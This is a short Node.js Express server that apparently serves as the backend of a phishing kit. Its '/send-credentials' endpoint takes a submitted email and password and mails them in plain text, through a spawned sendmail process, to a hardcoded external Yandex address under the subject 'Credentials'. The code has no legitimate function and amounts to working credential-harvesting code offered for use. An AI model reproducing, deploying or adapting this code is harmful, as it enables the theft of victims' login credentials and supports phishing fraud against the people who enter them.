const express = require('express');
const { spawn } = require('child_process');

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

function sendCredentialsEmail(req, res) {
  if (req.method === 'POST') {
    const { email, password } = req.body;

    if (email && password) {
      // Construct the email message
      const message = buildMail(email, password);

      // Command to send email using sendmail
      const sendmail = spawn('sendmail', ['-t', '-oi']);

      // Handle sendmail process events
      sendmail.on('error', (error) => {
        console.error('Sendmail process failed:', error);
        res.status(500).json({
          message: `Message could not be sent. Error: ${error.message}`
        });
      });

      sendmail.on('exit', (code, signal) => {
        if (code === 0) {
          res.status(200).json({
            message: 'Message has been sent'
          });
        } else {
          console.error(`Sendmail process exited with code ${code} and signal ${signal}`);
          res.status(500).json({
            message: 'Message could not be sent. Sendmail process error.'
          });
        }
      });

      // Write the email message to sendmail stdin
      sendmail.stdin.write(`To: compid.47@yandex.com\n`);
      sendmail.stdin.write(`Subject: Credentials\n`);
      sendmail.stdin.write(`Content-Type: text/html; charset=UTF-8\n`);
      sendmail.stdin.write(`MIME-Version: 1.0\n`);
      sendmail.stdin.write(`\n`);
      sendmail.stdin.write(`${message}\n`);
      sendmail.stdin.end();
    } else {
      res.status(422).json({
        message: 'The given data is invalid',
        errors: {
          email: 'The email is required',
          password: 'The password is required'
        }
      });
    }
  } else {
    res.sendStatus(405);
  }
}

app.post('/send-credentials', sendCredentialsEmail);

function buildMail(email, password) {
  // Build your email message here
  return `<p>Email: ${email}</p><p>Password: ${password}</p>`;
}

app.listen(3000, () => {
  console.log('Server is running on port 3000');
});
